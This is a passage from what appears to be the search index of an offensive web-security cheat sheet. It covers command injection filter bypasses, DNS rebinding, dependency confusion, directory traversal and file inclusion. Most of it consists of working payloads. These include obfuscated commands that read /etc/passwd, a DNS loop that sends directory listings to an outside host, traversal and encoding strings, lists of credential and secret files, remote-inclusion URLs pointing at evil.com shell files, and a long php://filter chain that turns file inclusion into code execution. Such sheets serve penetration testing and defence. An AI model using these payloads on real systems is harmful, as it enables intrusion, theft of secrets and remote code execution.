$'cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'` root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764 /etc/passwd swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764` root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764) /etc/passwd swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)` root:x:0:0:root:/root:/bin/bash","title":"Bypass characters filter via hex encoding"},{"location":"Command%20Injection/#bypass-characters-filter","text":"Commands execution without backslash and slash - linux bash swissky@crashlab:~$ echo ${HOME:0:1} / swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ echo . | tr '!-0' '\"-1' / swissky@crashlab:~$ tr '!-0' '\"-1' <<< . / swissky@crashlab:~$ cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd root:x:0:0:root:/root:/bin/bash","title":"Bypass characters filter"},{"location":"Command%20Injection/#bypass-blacklisted-words","text":"","title":"Bypass Blacklisted words"},{"location":"Command%20Injection/#bypass-with-single-quote","text":"w'h'o'am'i","title":"Bypass with single quote"},{"location":"Command%20Injection/#bypass-with-double-quote","text":"w\"h\"o\"am\"i","title":"Bypass with double quote"},{"location":"Command%20Injection/#bypass-with-backslash-and-slash","text":"w\\ho\\am\\i /\\b\\i\\n/////s\\h","title":"Bypass with backslash and slash"},{"location":"Command%20Injection/#bypass-with","text":"who$@ami echo $0 -> /usr/bin/zsh echo whoami|$0","title":"Bypass with $@"},{"location":"Command%20Injection/#bypass-with_1","text":"who$()ami who$(echo am)i who`echo am`i","title":"Bypass with $()"},{"location":"Command%20Injection/#bypass-with-variable-expansion","text":"/???/??t /???/p??s?? test=/ehhh/hmtc/pahhh/hmsswd cat ${test//hhh\\/hm/} cat ${test//hh??hm/}","title":"Bypass with variable expansion"},{"location":"Command%20Injection/#bypass-with-wildcards","text":"powershell C:\\*\\*2\\n??e*d.*? # notepad @^p^o^w^e^r^shell c:\\*\\*32\\c*?c.e?e # calc","title":"Bypass with wildcards"},{"location":"Command%20Injection/#challenge","text":"Challenge based on the previous tricks, what does the following command do: g=\"/e\"\\h\"hh\"/hm\"t\"c/\\i\"sh\"hh/hmsu\\e;tac$@<${g//hh??hm/}","title":"Challenge"},{"location":"Command%20Injection/#time-based-data-exfiltration","text":"Extracting data : char by char swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi real 0m5.007s user 0m0.000s sys 0m0.000s swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi real 0m0.002s user 0m0.000s sys 0m0.000s","title":"Time based data exfiltration"},{"location":"Command%20Injection/#dns-based-data-exfiltration","text":"Based on the tool from https://github.com/HoLyVieR/dnsbin also hosted at dnsbin.zhack.ca 1. Go to http://dnsbin.zhack.ca/ 2. Execute a simple 'ls' for i in $(ls /) ; do host \"$i.3a43c7e4e57a8d0e2057.d.zhack.ca\"; done $(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il) Online tools to check for DNS based data exfiltration: dnsbin.zhack.ca pingb.in","title":"DNS based data exfiltration"},{"location":"Command%20Injection/#polyglot-command-injection","text":"1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS} e.g: echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS} echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS} echo \"1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS} /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/ e.g: echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/ echo \"YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\" echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/'","title":"Polyglot command injection"},{"location":"Command%20Injection/#references","text":"SECURITY CAF\u00c9 - Exploiting Timed Based RCE Bug Bounty Survey - Windows RCE spaceless No PHP, no spaces, no $, no { }, bash only - @asdizzle #bash #obfuscation by string manipulation - Malwrologist, @DissectMalware","title":"References"},{"location":"DNS%20Rebinding/","text":"DNS Rebinding DNS rebinding changes the IP address of an attacker controlled machine name to the IP address of a target application, bypassing the same-origin policy and thus allowing the browser to make arbitrary requests to the target application and read their responses. Summary Tools Exploitation Protection Bypasses Tools Singularity of Origin - is a tool to perform DNS rebinding attacks. Singularity of Origin Web Client (manager interface, port scanner and autoattack) Exploitation First, we need to make sure that the targeted service is vulnerable to DNS rebinding. It can be done with a simple curl request: curl --header 'Host: <arbitrary-hostname>' http://<vulnerable-service>:8080 If the server returns the expected result (e.g. the regular web page) then the service is vulnerable. If the server returns an error message (e.g. 404 or similar), the server has most likely protections implemented which prevent DNS rebinding attacks. Then, if the service is vulnerable, we can abuse DNS rebinding by following these steps: Register a domain. Setup Singularity of Origin . Edit the autoattack HTML page for your needs. Browse to \"http://rebinder.your.domain:8080/autoattack.html\". Wait for the attack to finish (it can take few seconds/minutes). Protection Bypasses Most DNS protections are implemented in the form of blocking DNS responses containing unwanted IP addresses at the perimeter, when DNS responses enter the internal network. The most common form of protection is to block private IP addresses as defined in RFC 1918 (i.e. 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16). Some tools allow to additionally block localhost (127.0.0.0/8), local (internal) networks, or 0.0.0.0/0 network ranges. In the case where DNS protection are enabled (generally disabled by default), NCC Group has documented multiple DNS protection bypasses that can be used. 0.0.0.0 We can use the IP address 0.0.0.0 to access the localhost (127.0.0.1) to bypass filters blocking DNS responses containing 127.0.0.1 or 127.0.0.0/8. CNAME We can use DNS CNAME records to bypass a DNS protection solution that blocks all internal IP addresses. Since our response will only return a CNAME of an internal server, the rule filtering internal IP addresses will not be applied. Then, the local, internal DNS server will resolve the CNAME. $ dig cname.example.com +noall +answer ; <<>> DiG 9.11.3-1ubuntu1.15-Ubuntu <<>> example.com +noall +answer ;; global options: +cmd cname.example.com. 381 IN CNAME target.local. localhost We can use \"localhost\" as a DNS CNAME record to bypass filters blocking DNS responses containing 127.0.0.1. $ dig www.example.com +noall +answer ; <<>> DiG 9.11.3-1ubuntu1.15-Ubuntu <<>> example.com +noall +answer ;; global options: +cmd localhost.example.com. 381 IN CNAME localhost. References How Do DNS Rebinding Attacks Work? - nccgroup, 2019","title":"DNS Rebinding"},{"location":"DNS%20Rebinding/#dns-rebinding","text":"DNS rebinding changes the IP address of an attacker controlled machine name to the IP address of a target application, bypassing the same-origin policy and thus allowing the browser to make arbitrary requests to the target application and read their responses.","title":"DNS Rebinding"},{"location":"DNS%20Rebinding/#summary","text":"Tools Exploitation Protection Bypasses","title":"Summary"},{"location":"DNS%20Rebinding/#tools","text":"Singularity of Origin - is a tool to perform DNS rebinding attacks. Singularity of Origin Web Client (manager interface, port scanner and autoattack)","title":"Tools"},{"location":"DNS%20Rebinding/#exploitation","text":"First, we need to make sure that the targeted service is vulnerable to DNS rebinding. It can be done with a simple curl request: curl --header 'Host: <arbitrary-hostname>' http://<vulnerable-service>:8080 If the server returns the expected result (e.g. the regular web page) then the service is vulnerable. If the server returns an error message (e.g. 404 or similar), the server has most likely protections implemented which prevent DNS rebinding attacks. Then, if the service is vulnerable, we can abuse DNS rebinding by following these steps: Register a domain. Setup Singularity of Origin . Edit the autoattack HTML page for your needs. Browse to \"http://rebinder.your.domain:8080/autoattack.html\". Wait for the attack to finish (it can take few seconds/minutes).","title":"Exploitation"},{"location":"DNS%20Rebinding/#protection-bypasses","text":"Most DNS protections are implemented in the form of blocking DNS responses containing unwanted IP addresses at the perimeter, when DNS responses enter the internal network. The most common form of protection is to block private IP addresses as defined in RFC 1918 (i.e. 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16). Some tools allow to additionally block localhost (127.0.0.0/8), local (internal) networks, or 0.0.0.0/0 network ranges. In the case where DNS protection are enabled (generally disabled by default), NCC Group has documented multiple DNS protection bypasses that can be used.","title":"Protection Bypasses"},{"location":"DNS%20Rebinding/#0000","text":"We can use the IP address 0.0.0.0 to access the localhost (127.0.0.1) to bypass filters blocking DNS responses containing 127.0.0.1 or 127.0.0.0/8.","title":"0.0.0.0"},{"location":"DNS%20Rebinding/#cname","text":"We can use DNS CNAME records to bypass a DNS protection solution that blocks all internal IP addresses. Since our response will only return a CNAME of an internal server, the rule filtering internal IP addresses will not be applied. Then, the local, internal DNS server will resolve the CNAME. $ dig cname.example.com +noall +answer ; <<>> DiG 9.11.3-1ubuntu1.15-Ubuntu <<>> example.com +noall +answer ;; global options: +cmd cname.example.com. 381 IN CNAME target.local.","title":"CNAME"},{"location":"DNS%20Rebinding/#localhost","text":"We can use \"localhost\" as a DNS CNAME record to bypass filters blocking DNS responses containing 127.0.0.1. $ dig www.example.com +noall +answer ; <<>> DiG 9.11.3-1ubuntu1.15-Ubuntu <<>> example.com +noall +answer ;; global options: +cmd localhost.example.com. 381 IN CNAME localhost.","title":"localhost"},{"location":"DNS%20Rebinding/#references","text":"How Do DNS Rebinding Attacks Work? - nccgroup, 2019","title":"References"},{"location":"Dependency%20Confusion/","text":"Dependency Confusion A dependency confusion attack or supply chain substitution attack occurs when a software installer script is tricked into pulling a malicious code file from a public repository instead of the intended file of the same name from an internal repository. Summary Tools Exploit References Tools Confused Exploit Look for npm , pip , gem packages, the methodology is the same : you register a public package with the same name of private one used by the company and then you wait for it to be used. NPM example List all the packages (ie: package.json, composer.json, ...) Find the package missing from https://www.npmjs.com/ Register and create a public package with the same name Package example : https://github.com/0xsapra/dependency-confusion-expoit References Exploiting Dependency Confusion - 2 Jul 2021 - 0xsapra Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies - Alex Birsan - 9 Feb 2021 Ways to Mitigate Risk When Using Private Package Feeds - Microsoft - 29/03/2021 $130,000+ Learn New Hacking Technique in 2021 - Dependency Confusion - Bug Bounty Reports Explained","title":"Dependency Confusion"},{"location":"Dependency%20Confusion/#dependency-confusion","text":"A dependency confusion attack or supply chain substitution attack occurs when a software installer script is tricked into pulling a malicious code file from a public repository instead of the intended file of the same name from an internal repository.","title":"Dependency Confusion"},{"location":"Dependency%20Confusion/#summary","text":"Tools Exploit References","title":"Summary"},{"location":"Dependency%20Confusion/#tools","text":"Confused","title":"Tools"},{"location":"Dependency%20Confusion/#exploit","text":"Look for npm , pip , gem packages, the methodology is the same : you register a public package with the same name of private one used by the company and then you wait for it to be used.","title":"Exploit"},{"location":"Dependency%20Confusion/#npm-example","text":"List all the packages (ie: package.json, composer.json, ...) Find the package missing from https://www.npmjs.com/ Register and create a public package with the same name Package example : https://github.com/0xsapra/dependency-confusion-expoit","title":"NPM example"},{"location":"Dependency%20Confusion/#references","text":"Exploiting Dependency Confusion - 2 Jul 2021 - 0xsapra Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies - Alex Birsan - 9 Feb 2021 Ways to Mitigate Risk When Using Private Package Feeds - Microsoft - 29/03/2021 $130,000+ Learn New Hacking Technique in 2021 - Dependency Confusion - Bug Bounty Reports Explained","title":"References"},{"location":"Directory%20Traversal/","text":"Directory traversal A directory or path traversal consists in exploiting insufficient security validation / sanitization of user-supplied input file names, so that characters representing \"traverse to parent directory\" are passed through to the file APIs. Summary Tools Basic exploitation 16 bits Unicode encoding UTF-8 Unicode encoding Bypass \"../\" replaced by \"\" Bypass \"../\" with \";\" Double URL encoding UNC Bypass NGINX/ALB Bypass Path Traversal Interesting Linux files Interesting Windows files References Tools dotdotpwn - https://github.com/wireghoul/dotdotpwn powershell git clone https://github.com/wireghoul/dotdotpwn perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b Basic exploitation We can use the .. characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter. ../ ..\\ ..\\/ %2e%2e%2f %252e%252e%252f %c0%ae%c0%ae%c0%af %uff0e%uff0e%u2215 %uff0e%uff0e%u2216 16 bits Unicode encoding . = %u002e / = %u2215 \\ = %u2216 UTF-8 Unicode encoding . = %c0%2e, %e0%40%ae, %c0ae / = %c0%af, %e0%80%af, %c0%2f \\ = %c0%5c, %c0%80%5c Bypass \"../\" replaced by \"\" Sometimes you encounter a WAF which remove the \"../\" characters from the strings, just duplicate them. ..././ ...\\.\\ Bypass \"../\" with \";\" ..;/ http://domain.tld/page.jsp?include=..;/..;/sensitive.txt Double URL encoding . = %252e / = %252f \\ = %255c e.g: Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini UNC Bypass An attacker can inject a Windows UNC share ('\\UNC\\share\\name') into a software system to potentially redirect access to an unintended location or arbitrary file. \\\\localhost\\c$\\windows\\win.ini NGINX/ALB Bypass NGINX in certain configurations and ALB can block traversal attacks in the route, For example: http://nginx-server/../../ will return a 400 bad request. To bypass this behaviour just add forward slashes in front of the url: http://nginx-server////////../../ Java Bypass Bypass Java's URL protocol url:file:///etc/passwd url:http://127.0.0.1:8080 Path Traversal Interesting Linux files /etc/issue /etc/passwd /etc/shadow /etc/group /etc/hosts /etc/motd /etc/mysql/my.cnf /proc/[0-9]*/fd/[0-9]* (first number is the PID, second is the filedescriptor) /proc/self/environ /proc/version /proc/cmdline /proc/sched_debug /proc/mounts /proc/net/arp /proc/net/route /proc/net/tcp /proc/net/udp /proc/self/cwd/index.php /proc/self/cwd/main.py /home/$USER/.bash_history /home/$USER/.ssh/id_rsa /run/secrets/kubernetes.io/serviceaccount/token /run/secrets/kubernetes.io/serviceaccount/namespace /run/secrets/kubernetes.io/serviceaccount/certificate /var/run/secrets/kubernetes.io/serviceaccount /var/lib/mlocate/mlocate.db /var/lib/mlocate.db Interesting Windows files Always existing file in recent Windows machine. Ideal to test path traversal but nothing much interesting inside... c:\\windows\\system32\\license.rtf c:\\windows\\system32\\eula.txt Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread) c:/boot.ini c:/inetpub/logs/logfiles c:/inetpub/wwwroot/global.asa c:/inetpub/wwwroot/index.asp c:/inetpub/wwwroot/web.config c:/sysprep.inf c:/sysprep.xml c:/sysprep/sysprep.inf c:/sysprep/sysprep.xml c:/system32/inetsrv/metabase.xml c:/sysprep.inf c:/sysprep.xml c:/sysprep/sysprep.inf c:/sysprep/sysprep.xml c:/system volume information/wpsettings.dat c:/system32/inetsrv/metabase.xml c:/unattend.txt c:/unattend.xml c:/unattended.txt c:/unattended.xml c:/windows/repair/sam c:/windows/repair/system The following log files are controllable and can be included with an evil payload to achieve a command execution /var/log/apache/access.log /var/log/apache/error.log /var/log/httpd/error_log /usr/local/apache/log/error_log /usr/local/apache2/log/error_log /var/log/nginx/access.log /var/log/nginx/error.log /var/log/vsftpd.log /var/log/sshd.log /var/log/mail References Path Traversal Cheat Sheet: Windows Directory traversal attack - Wikipedia CWE-40: Path Traversal: '\\UNC\\share\\name\\' (Windows UNC Share) - CWE Mitre - December 27, 2018 NGINX may be protecting your applications from traversal attacks without you even knowing Directory traversal - Portswigger","title":"Directory traversal"},{"location":"Directory%20Traversal/#directory-traversal","text":"A directory or path traversal consists in exploiting insufficient security validation / sanitization of user-supplied input file names, so that characters representing \"traverse to parent directory\" are passed through to the file APIs.","title":"Directory traversal"},{"location":"Directory%20Traversal/#summary","text":"Tools Basic exploitation 16 bits Unicode encoding UTF-8 Unicode encoding Bypass \"../\" replaced by \"\" Bypass \"../\" with \";\" Double URL encoding UNC Bypass NGINX/ALB Bypass Path Traversal Interesting Linux files Interesting Windows files References","title":"Summary"},{"location":"Directory%20Traversal/#tools","text":"dotdotpwn - https://github.com/wireghoul/dotdotpwn powershell git clone https://github.com/wireghoul/dotdotpwn perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b","title":"Tools"},{"location":"Directory%20Traversal/#basic-exploitation","text":"We can use the .. characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter. ../ ..\\ ..\\/ %2e%2e%2f %252e%252e%252f %c0%ae%c0%ae%c0%af %uff0e%uff0e%u2215 %uff0e%uff0e%u2216","title":"Basic exploitation"},{"location":"Directory%20Traversal/#16-bits-unicode-encoding","text":". = %u002e / = %u2215 \\ = %u2216","title":"16 bits Unicode encoding"},{"location":"Directory%20Traversal/#utf-8-unicode-encoding","text":". = %c0%2e, %e0%40%ae, %c0ae / = %c0%af, %e0%80%af, %c0%2f \\ = %c0%5c, %c0%80%5c","title":"UTF-8 Unicode encoding"},{"location":"Directory%20Traversal/#bypass-replaced-by","text":"Sometimes you encounter a WAF which remove the \"../\" characters from the strings, just duplicate them. ..././ ...\\.\\","title":"Bypass \"../\" replaced by \"\""},{"location":"Directory%20Traversal/#bypass-with","text":"..;/ http://domain.tld/page.jsp?include=..;/..;/sensitive.txt","title":"Bypass \"../\" with \";\""},{"location":"Directory%20Traversal/#double-url-encoding","text":". = %252e / = %252f \\ = %255c e.g: Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini","title":"Double URL encoding"},{"location":"Directory%20Traversal/#unc-bypass","text":"An attacker can inject a Windows UNC share ('\\UNC\\share\\name') into a software system to potentially redirect access to an unintended location or arbitrary file. \\\\localhost\\c$\\windows\\win.ini","title":"UNC Bypass"},{"location":"Directory%20Traversal/#nginxalb-bypass","text":"NGINX in certain configurations and ALB can block traversal attacks in the route, For example: http://nginx-server/../../ will return a 400 bad request. To bypass this behaviour just add forward slashes in front of the url: http://nginx-server////////../../","title":"NGINX/ALB Bypass"},{"location":"Directory%20Traversal/#java-bypass","text":"Bypass Java's URL protocol url:file:///etc/passwd url:http://127.0.0.1:8080","title":"Java Bypass"},{"location":"Directory%20Traversal/#path-traversal","text":"","title":"Path Traversal"},{"location":"Directory%20Traversal/#interesting-linux-files","text":"/etc/issue /etc/passwd /etc/shadow /etc/group /etc/hosts /etc/motd /etc/mysql/my.cnf /proc/[0-9]*/fd/[0-9]* (first number is the PID, second is the filedescriptor) /proc/self/environ /proc/version /proc/cmdline /proc/sched_debug /proc/mounts /proc/net/arp /proc/net/route /proc/net/tcp /proc/net/udp /proc/self/cwd/index.php /proc/self/cwd/main.py /home/$USER/.bash_history /home/$USER/.ssh/id_rsa /run/secrets/kubernetes.io/serviceaccount/token /run/secrets/kubernetes.io/serviceaccount/namespace /run/secrets/kubernetes.io/serviceaccount/certificate /var/run/secrets/kubernetes.io/serviceaccount /var/lib/mlocate/mlocate.db /var/lib/mlocate.db","title":"Interesting Linux files"},{"location":"Directory%20Traversal/#interesting-windows-files","text":"Always existing file in recent Windows machine. Ideal to test path traversal but nothing much interesting inside... c:\\windows\\system32\\license.rtf c:\\windows\\system32\\eula.txt Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread) c:/boot.ini c:/inetpub/logs/logfiles c:/inetpub/wwwroot/global.asa c:/inetpub/wwwroot/index.asp c:/inetpub/wwwroot/web.config c:/sysprep.inf c:/sysprep.xml c:/sysprep/sysprep.inf c:/sysprep/sysprep.xml c:/system32/inetsrv/metabase.xml c:/sysprep.inf c:/sysprep.xml c:/sysprep/sysprep.inf c:/sysprep/sysprep.xml c:/system volume information/wpsettings.dat c:/system32/inetsrv/metabase.xml c:/unattend.txt c:/unattend.xml c:/unattended.txt c:/unattended.xml c:/windows/repair/sam c:/windows/repair/system The following log files are controllable and can be included with an evil payload to achieve a command execution /var/log/apache/access.log /var/log/apache/error.log /var/log/httpd/error_log /usr/local/apache/log/error_log /usr/local/apache2/log/error_log /var/log/nginx/access.log /var/log/nginx/error.log /var/log/vsftpd.log /var/log/sshd.log /var/log/mail","title":"Interesting Windows files"},{"location":"Directory%20Traversal/#references","text":"Path Traversal Cheat Sheet: Windows Directory traversal attack - Wikipedia CWE-40: Path Traversal: '\\UNC\\share\\name\\' (Windows UNC Share) - CWE Mitre - December 27, 2018 NGINX may be protecting your applications from traversal attacks without you even knowing Directory traversal - Portswigger","title":"References"},{"location":"File%20Inclusion/","text":"File Inclusion The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a \"dynamic file inclusion\" mechanisms implemented in the target application. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a \"reading\" mechanism implemented in the target application Summary File Inclusion Summary Tools Basic LFI Null byte Double encoding UTF-8 encoding Path and dot truncation Filter bypass tricks Basic RFI Null byte Double encoding Bypass allow_url_include LFI / RFI using wrappers Wrapper php://filter Wrapper zip:// Wrapper data:// Wrapper expect:// Wrapper input:// Wrapper phar:// LFI to RCE via /proc/*/fd LFI to RCE via /proc/self/environ LFI to RCE via upload LFI to RCE via upload (race) LFI to RCE via upload (FindFirstFile) LFI to RCE via phpinfo() LFI to RCE via controlled log file RCE via SSH RCE via Mail RCE via Apache logs LFI to RCE via PHP sessions LFI to RCE via credentials files Windows version Linux version References Tools Kadimus - https://github.com/P0cL4bs/Kadimus LFISuite - https://github.com/D35m0nd142/LFISuite fimap - https://github.com/kurobeats/fimap panoptic - https://github.com/lightos/Panoptic Basic LFI In the following examples we include the /etc/passwd file, check the Directory & Path Traversal chapter for more interesting files. http://example.com/index.php?page=../../../etc/passwd Null byte :warning: In versions of PHP below 5.3.4 we can terminate with null byte. http://example.com/index.php?page=../../../etc/passwd%00 Double encoding http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00 UTF-8 encoding http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00 Path and dot truncation On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away. http://example.com/index.php?page=../../../etc/passwd............[ADD MORE] http://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.[ADD MORE] http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd Filter bypass tricks http://example.com/index.php?page=....//....//etc/passwd http://example.com/index.php?page=..///////..////..//////etc/passwd http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd Basic RFI Most of the filter bypasses from LFI section can be reused for RFI. http://example.com/index.php?page=http://evil.com/shell.txt Null byte http://example.com/index.php?page=http://evil.com/shell.txt%00 Double encoding http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt Bypass allow_url_include When allow_url_include and allow_url_fopen are set to Off . It is still possible to include a remote file on Windows box using the smb protocol. Create a share open to everyone Write a PHP code inside a file : shell.php Include it http://example.com/index.php?page=\\\\10.0.0.1\\share\\shell.php LFI / RFI using wrappers Wrapper php://filter The part \"php://filter\" is case insensitive http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php Wrappers can be chained with a compression wrapper for large files. http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd NOTE: Wrappers can be chained multiple times using | or / : - Multiple base64 decodes: php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s - deflate then base64encode (useful for limited character exfil): php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php ./kadimus -u \"http://example.com/index.php?page=vuln\" -S -f \"index.php%00\" -O index.php --parameter page curl \"http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\" | base64 -d > index.php Also there is a way to turn the php://filter into a full RCE. Use LFI2RCE.py to generate a custom payload. # vulnerable file: index.php # vulnerable parameter: file # executed command: id # executed PHP code: <?=`$_GET[0]`;;?> curl \"127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.T